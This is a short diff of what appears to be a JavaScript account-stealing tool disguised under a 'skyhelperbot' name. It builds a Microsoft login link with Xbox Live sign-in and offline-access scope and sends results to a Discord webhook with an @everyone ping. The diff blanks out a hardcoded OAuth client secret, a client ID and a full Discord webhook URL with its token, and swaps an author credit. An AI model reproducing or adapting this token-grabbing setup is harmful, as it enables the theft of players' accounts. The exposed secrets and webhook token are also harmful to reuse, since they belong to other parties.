@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'mA58Q~mh1rWe~Q52k77V2.47jPdtfaVox4MHHcQT' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
-const redirect_uri = 'https://skyhelperbot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
+const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = ''
+const redirect_uri = ''
+const webhook_url = ''
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
@@ -229,7 +229,7 @@ content: "@everyone ",
         
       ],
       "footer": {
-        "text": "By heda",
+        "text": "By Average",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
